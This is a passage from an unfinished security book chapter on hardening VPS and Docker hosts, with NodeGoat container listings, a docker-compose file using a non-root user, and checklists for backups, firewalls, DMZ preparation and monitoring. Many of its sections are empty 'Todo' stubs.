    68 -rw-r--r--   1 root            root              48 Nov 21  2015 Procfile
    64 -rw-r--r--   1 root            root            5.6K Sep 12 04:22 README.md
    56 drwxr-xr-x   6 root            root            4.0K Nov 21  2015 app
    66 -rw-r--r--   1 root            root             527 Nov 15  2015 app.json
    54 drwxr-xr-x   3 root            root            4.0K May 16 11:41 artifacts
    62 drwxr-xr-x   3 root            root            4.0K Nov 21  2015 config
    57 -rw-r--r--   1 root            root             244 Sep 13 04:51 docker-compose.yml
    67 drwxr-xr-x 498 root            root             20K Sep 12 03:50 node_modules
    63 -rw-r--r--   1 root            root            1.4K Sep 12 04:22 package.json
    52 -rw-r--r--   1 root            root            4.6K Sep 12 04:01 server.js
    59 drwxr-xr-x   4 root            root            4.0K Nov 21  2015 test
     ---> ad42366b24d7
    Removing intermediate container f8692fc32cc7
    Step 13 : RUN ls ../ -liah
     ---> Running in 4074cc02dd1d
    total 12K
    12 drwxr-xr-x  7 root            root            4.0K Sep 13 09:00 .
    11 drwxr-xr-x 32 root            root            4.0K Sep 13 09:00 ..
    13 drwxr-xr-x  9 nodegoat_docker nodegoat_docker 4.0K Sep 13 09:00 app

With reapplication of the ownership and permissions of the non-root user, as the `Dockerfile` is currently above, the container directory listings look like the following:

{title="With reapplication of ownership and permissions", linenos=off}
    Step 15 : RUN ls -liah
     ---> Running in 8662e1657d0f
    total 116K
    13 drwxr-x---   21 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 .
    12 drwxr-xr-x    9 root            root            4.0K Sep 13 08:51 ..
    65 drwxr-x---   20 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 .git
    53 -rw-r-----    1 nodegoat_docker nodegoat_docker  178 Sep 12 04:22 .gitignore
    69 -rw-r-----    1 nodegoat_docker nodegoat_docker 1.9K Nov 21  2015 .jshintrc
    61 -rw-r-----    1 nodegoat_docker nodegoat_docker   55 Nov 21  2015 .nodemonignore
    58 -rw-r-----    1 nodegoat_docker nodegoat_docker  884 Sep 13 08:46 Dockerfile
    55 -rw-r-----    1 nodegoat_docker nodegoat_docker 6.6K Sep 12 04:16 Gruntfile.js
    60 -rw-r-----    1 nodegoat_docker nodegoat_docker  11K Nov 21  2015 LICENSE
    68 -rw-r-----    1 nodegoat_docker nodegoat_docker   48 Nov 21  2015 Procfile
    64 -rw-r-----    1 nodegoat_docker nodegoat_docker 5.6K Sep 12 04:22 README.md
    56 drwxr-x---   14 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 app
    66 -rw-r-----    1 nodegoat_docker nodegoat_docker  527 Nov 15  2015 app.json
    54 drwxr-x---    5 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 artifacts
    62 drwxr-x---    5 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 config
    57 -rw-r-----    1 nodegoat_docker nodegoat_docker  244 Sep 13 04:51 docker-compose.yml
    67 drwxr-x--- 1428 nodegoat_docker nodegoat_docker  20K Sep 13 08:51 node_modules
    63 -rw-r-----    1 nodegoat_docker nodegoat_docker 1.4K Sep 12 04:22 package.json
    52 -rw-r-----    1 nodegoat_docker nodegoat_docker 4.6K Sep 12 04:01 server.js
    59 drwxr-x---    8 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 test
     ---> b88d816315b1
    Removing intermediate container 8662e1657d0f
    Step 16 : RUN ls ../ -liah
     ---> Running in 0ee2dcc889a6
    total 12K
    12 drwxr-xr-x  9 root            root            4.0K Sep 13 08:51 .
    11 drwxr-xr-x 34 root            root            4.0K Sep 13 08:51 ..
    13 drwxr-x--- 21 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 app

An alternative to setting the non-root user in the `Dockerfile`, is to set it in the `docker-compose.yml`, providing the non-root user has been added to the image in the `Dockerfile`. In the case of NodeGoat, the mongo `Dockerfile` is maintained by DockerHub, and it adds a user called `mongodb`. Then in the NodeGoat projects `docker-compose.yml`, we just need to set the user, as seen on line 13 below:

{title="NodeGoat docker-compose.yml", linenos=on}
    version: "2.0"
    
    services:
      web:
        build: .
        command: bash -c "node artifacts/db-reset.js && npm start"
        ports:
          - "4000:4000"
        links:
          - mongo
      mongo:
        image: mongo:latest
        user: mongodb
        expose:
          - "27017"















































_Todo_

%% Resources for continuing: 
%% http://resources.infosecinstitute.com/docker-and-enterprise-security-establishing-best-practices/
%% https://benchmarks.cisecurity.org/downloads/show-single/?file=docker12.100
%% https://www.google.com/search?q=docker+security&oq=docker+security&aqs=chrome.0.0j69i60j0l4.6176j0j7&client=ubuntu&sourceid=chrome&ie=UTF-8
%% https://docs.docker.com/engine/security/security/
%% https://theinvisiblethings.blogspot.co.nz/2012/09/how-is-qubes-os-different-from.html


### Using Components with Known Vulnerabilities

Just do not do this. Either stay disciplined and upgrade your servers manually or automate it. Start out the way you intend to go. Work out your strategy for keeping your system(s) up to date and patched. There are many options here. If you go auto, make sure you test on a staging environment before upgrading live.

### Schedule Backups {#vps-countermeasures-schedule-backups}
![](images/ThreatTags/PreventionEASY.png)

Make sure all your data and VM images are backed up routinely. Make sure you test that restoring your backups work. Backup or source control system files, deployment scripts and what ever else is important to you. Make sure you have backups of your backups and source control. There are plenty of [tools](http://www.debianhelp.co.uk/backuptools.htm) available to help. Also make sure you are backing up the entire VM if your machine is a virtual guest by export/import OVF files. I also like to backup all the VM files. Disk space is cheap. Is there such a thing as being too prepared for a disaster? I don't think I have seen it yet. It is just a matter of time before you will be calling on your backups.

### Host Firewall
![](images/ThreatTags/PreventionEASY.png)

This is one of the last things you should look at. In fact, it is not really needed if you have taken the time to remove unnecessary services and harden what is left. If you use a host firewall keep your set of rules to a minimum to reduce confusion and increase legibility. Maintain both ingress & egress.

### Preparation for DMZ

The following is a final type of check-list that I like to use before opening a hardened web server to the world. You will probably have additional items you can add.

#### Confirm DMZ has

1. [Network Intrustion Dettection System (NIDS)](#network-countermeasures-lack-of-visibility-nids), Network Intrusion Prevention System (NIPS) installed and configured correctly. Snort is a good place to start for the NIDS part, although with some work Snort can help with the [Prevention](https://www.ibm.com/developerworks/community/blogs/58e72888-6340-46ac-b488-d31aa4058e9c/entry/august_8_2012_12_01_pm6?lang=en) also.
2. Incoming access from your LAN or where ever you plan on administering it from.
3. Rules for outgoing and incoming access to/from LAN, WAN tightly filtered.

#### Additional Web Server Preparation

1. Set-up and configure your soft web server
2. Set-up and configure caching proxy. Ex:
  * node-http-proxy
  * TinyProxy
  * Varnish
  * nginx
  * CloudFlare
3. Deploy application files, you may use Docker or one of my deployment tools  
[https://github.com/binarymist/DeploymentTool](https://github.com/binarymist/DeploymentTool)  

![](images/BinaryMistDeploymentTool.png)  
  
4. Hopefully you have been baking security into your web application right from the start. This is an essential part of defence in depth. Rather than having your application completely rely on other security layers to protect it, it should also be standing up for itself and understanding when it is under attack and actually [fighting back](#web-applications-countermeasures-lack-of-active-automated-prevention), as we discuss in the Web Applications chapter under "Lack of Active Automated Prevention".
5. Set static IP address
6. Double check that the only open ports on the web server are 80 and what ever you have chosen for SSH.
7. Set-up [SSH tunnel](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh), so you can access your server from your LAN or where ever it is that you will be administering it from.
8. Decide on, document VM [backup strategy](#vps-countermeasures-schedule-backups), set it up, and make sure your team knows all about it. Do not be that single point of failure.

### Post DMZ Considerations

1. Set-up your `CNAME` or what ever type of `DNS` record you are using
2. Now remember, keeping any machine on (not just the internet, but any) a network requires constant consideration and effort in keeping the system as secure as possible.
3. [Work through](https://www.debian.org/doc/manuals/securing-debian-howto/ch-automatic-harden.en.html#s6.1) using the likes of [harden](https://packages.debian.org/wheezy/harden) and [Lynis](https://cisofy.com/lynis/) for your server and [harden-surveillance](https://packages.debian.org/wheezy/harden-surveillance) for monitoring your network.
4. Consider combining “Port Scan Attack Detector” ([psad](https://packages.debian.org/stretch/psad)) with [fwsnort](https://packages.debian.org/stretch/fwsnort) and Snort.
5. Hack your own server and find the holes before someone else does. If you are not already familiar with the tricks of how systems on the internet get attacked, read up on the “[Attacks and Threats](http://www.tldp.org/HOWTO/Security-Quickstart-HOWTO/appendix.html#THREATS)”, Run [OpenVAS](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#vulnerability-scanners), Run [Web Vulnerability Scanners](https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#web-vulnerability-scanners) 

## 4. SSM Risks that Solution Causes
> Are there any? If so what are they?

* Just beware that if you are intending to break the infrastructure or even what is running on your VPS(s) if they are hosted on someone else's infrastructure, that you make sure you have all the tests you intend to carry out documented including what could possibly go wrong, accepted and signed by your provider. Good luck with this. That is why I usually recommend self hosting.
* Keep in mind: that if you do not break your system(s), someone else will.
* Possible time constraints: It takes time to find skilled workers, gain expertise, set-up and configure.
* Many of the points I have raised around VPS hardening require maintenance.

### Forfeit Control thus Security

_Todo_

### Windows

_Todo_

#### PSExec

_Todo_

### Minimise Attack Surface by Installing Only what you Need

_Todo_

### Disable, Remove Services. Harden what is left

_Todo_

#### Partitioning on OS Installation

_Todo_

#### Apt Proxy Set-up

_Todo_

#### Review Password Strategies

_Todo_

#### Disable Remote Root Logins

_Todo_

#### SSH

_Todo_

#### Disable Boot Options

_Todo_

#### Mounting of Partitions

_Todo_

#### Portmap

_Todo_

#### Exim

_Todo_

#### Remove NIS

_Todo_

#### Rpcbind

_Todo_

#### Telnet

_Todo_

#### FTP

_Todo_

#### NFS

_Todo_

### Lack of Visibility

_Todo_

#### Logging and Alerting

_Todo_

%% Logging and Alerting is never going to be a complete solution. There is risk that people think that one or two tools mean they are covered from every type of attack.
%% A large array of diverse countermeasures is always going to be required to produce good visibility of your system(s). Even using multiple tools that do similar jobs but take different strategies on how they execute and in-fact from where they run.
%% For example using a file integrity checker that resides on your target server and others that reside on servers somewhere else that run against the target server. An attacker will very often not realise that they are under observation if they can not see the observer running on the machine that they are on.
%% This sort of strategy provides a false sense of self security for the attacker. In a way a similar concept to the honey pot. They may know about a tool operating on the server they are on and even have disabled it, but if you keep the defence in depth mentality, you may just have the upper hand without the attacker being aware of it. This can create perfect ambush.
%% Add defence in depth diagram from CampJS talk again.

#### Proactive Monitoring

_Todo_

Over confidence in monitoring tools. For example an attacker could try and replace the configuration files for Monit or the Monit daemon itself, so the following sorts of tests would either not run or return tampered with results:

  * File checksum testing
  * File size testing
  * File content testing
  * Filesystem flags testing

In saying that, if you have an agentless (running from somewhere else) file integrity checker or even several of them running on different machines and as part of their scope are checking Monit, then the attacker is going to have to find the agentless file integrity checker(s) and disable them also without being noticed. Especially as I disguised in regards to Stealth, that the recommendation was that the Monitor not accept any incoming connections, and be in a physically safe location. This is increasing the level difficulty significantly.

You could and should also have NIDs running on your network which makes this even more likely that an attacker is going to step on a land mine.

_Todo_


#### Host Intrusion Detection Systems (HIDS)

_Todo_

### Docker

_Todo_

### Using Components with Known Vulnerabilities

_Todo_

### Schedule Backups

_Todo_

### Host Firewall

Personally I prefer not to rely on firewalls, once you have removed any surplus services and hardened what is left, firewalls do not provide a lot of benefit. I recommend not relying on them, but instead making your system(s) hard enough so that you do not require a firewall. Then if you decide to add one, they will be just another layer of defence. Dependence on firewalls often produce a single point of failure and a false sense of security, as to much trust is placed in them to protect weak and vulnerable services and communications that should instead be hardened themselves.

## 5. SSM Costs and Trade-offs

### Forfeit Control thus Security

_Todo_

### Windows

_Todo_

#### PSExec

_Todo_

### Minimise Attack Surface by Installing Only what you Need

_Todo_

### Disable, Remove Services. Harden what is left

_Todo_

#### Partitioning on OS Installation

_Todo_

#### Apt Proxy Set-up

_Todo_

#### Review Password Strategies

_Todo_

#### Disable Remote Root Logins

_Todo_

#### SSH

_Todo_

#### Disable Boot Options

_Todo_

#### Mounting of Partitions

_Todo_

#### Portmap

_Todo_

#### Exim

_Todo_

#### Remove NIS

_Todo_

#### Rpcbind

_Todo_

#### Telnet

_Todo_

#### FTP

_Todo_

#### NFS

_Todo_

### Lack of Visibility

_Todo_

#### Logging and Alerting

_Todo_

#### Proactive Monitoring

_Todo_

#### Host Intrusion Detection Systems (HIDS)

_Todo_

### Docker

_Todo_

### Using Components with Known Vulnerabilities

_Todo_

### Schedule Backups

_Todo_

### Host Firewall

A host firewall can be a good temporary patch, and that is the problem. Nothing is as permanent as a temporary patch. A firewall is a single layer of defence and one that is often used to hide the inadequacies of the rest of the layers of defence.